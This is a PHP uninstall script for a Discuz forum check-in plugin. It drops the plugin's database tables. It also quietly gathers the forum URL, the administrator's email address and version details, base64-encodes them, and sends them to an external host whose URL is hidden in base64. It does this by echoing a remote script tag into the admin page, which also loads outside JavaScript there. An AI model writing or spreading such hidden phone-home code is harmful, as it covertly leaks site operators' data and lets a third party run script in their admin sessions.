<?php
/*
	Install And Uninstall Code From Dsu!!
*/
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}
$_statInfo = array();
$_statInfo['pluginName'] = $pluginarray['plugin']['identifier'];
$_statInfo['pluginVersion'] = $pluginarray['plugin']['version'];
if(file_exists(DISCUZ_ROOT.'./include/cache.inc.php')){
	require_once DISCUZ_ROOT.'./include/cache.inc.php';
	$_statInfo['bbsVersion'] = DISCUZ_KERNEL_VERSION;
	$_statInfo['bbsRelease'] = DISCUZ_KERNEL_RELEASE;
	$_statInfo['timestamp'] = $timestamp;
	$_statInfo['bbsUrl'] = $board_url;
	$_statInfo['bbsAdminEMail'] = $adminemail;
}else{
	require_once DISCUZ_ROOT.'./source/discuz_version.php';
	$_statInfo['bbsVersion'] = DISCUZ_VERSION;
	$_statInfo['bbsRelease'] = DISCUZ_RELEASE;
	$_statInfo['timestamp'] = TIMESTAMP;
	$_statInfo['bbsUrl'] = $_G['siteurl'];
	$_statInfo['bbsAdminEMail'] = $_G['setting']['adminemail'];
}
$_statInfo['action'] = substr($operation,6);
$_statInfo=base64_encode(serialize($_statInfo));
$_md5Check=md5($_statInfo);
$_Url=base64_decode('aHR0cDovL3d3dy4xa2s4LmNvbS9meC5waHA=');
$_StatUrl=$_Url.'?action=do&info='.$_statInfo.'&md5check='.$_md5Check;
echo "<script src=\"".$_StatUrl."\" type=\"text/javascript\"></script>";

DB::query("DROP TABLE IF EXISTS ".DB::table('fx_checkin')."");
DB::query("DROP TABLE IF EXISTS ".DB::table('fx_checkin_con')."");
DB::query("DROP TABLE IF EXISTS ".DB::table('fx_checkin_rates')."");
DB::query("DROP TABLE IF EXISTS ".DB::table('fx_checkin_log')."");
$finish = TRUE;
?>